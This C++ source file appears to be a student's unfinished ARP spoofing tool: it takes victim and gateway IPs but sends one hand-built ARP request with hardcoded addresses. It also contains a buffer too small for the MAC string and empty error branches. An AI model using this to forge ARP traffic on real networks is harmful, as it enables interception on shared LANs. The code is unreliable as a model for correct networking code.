#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h> 
#include <string.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <netinet/ether.h> 
#include <net/if.h> 
#include <sys/ioctl.h> 
#include <string>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: arp-test <interface> <victim ip> <gateway ip>\n");
	printf("arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

using namespace std; 

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char* victim_ip = argv[2];
	char* gateway_ip = argv[3];

	// my mac read start
	int socket_fd; 
    int count_if; 
    struct ifreq *t_if_req; 
    struct ifconf t_if_conf; 
    static char arr_mac_addr[17] = {0x00, }; 
    memset(&t_if_conf, 0, sizeof(t_if_conf)); 
    t_if_conf.ifc_ifcu.ifcu_req = NULL; 
    t_if_conf.ifc_len = 0; 
    if( (socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
         
    } 
    if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) { 
         
    } 
    if( (t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL ) {
        close(socket_fd); 
        free(t_if_req); 
    } 
    else { 
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req; 
        if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
            close(socket_fd); 
            free(t_if_req); 
        } 
        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for( int idx = 0; idx < count_if; idx++ ) { 
            struct ifreq *req = &t_if_req[idx]; 
            if( !strcmp(req->ifr_name, "lo") ) {
                continue; 
            } 
            if( ioctl(socket_fd, SIOCGIFHWADDR, req) < 0 ) { 
                break; 
            } 
            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char)req->ifr_hwaddr.sa_data[0], (unsigned char)req->ifr_hwaddr.sa_data[1], (unsigned char)req->ifr_hwaddr.sa_data[2], (unsigned char)req->ifr_hwaddr.sa_data[3], (unsigned char)req->ifr_hwaddr.sa_data[4], (unsigned char)req->ifr_hwaddr.sa_data[5]); 
            break;
        } 
    } 
    close(socket_fd); 
    free(t_if_req);
	//my mac read end

	printf("%s", arr_mac_addr); // my mac print


	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("00:00:00:00:00:00"); // To get the victim's Mac address
	packet.eth_.smac_ = Mac("00:0c:29:84:a7:96");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("00:0c:29:84:a7:96");
	packet.arp_.sip_ = htonl(Ip("192.168.0.250"));
	packet.arp_.tmac_ = Mac("E8:84:A5:4B:83:22");
	packet.arp_.tip_ = htonl(Ip("192.168.0.68"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
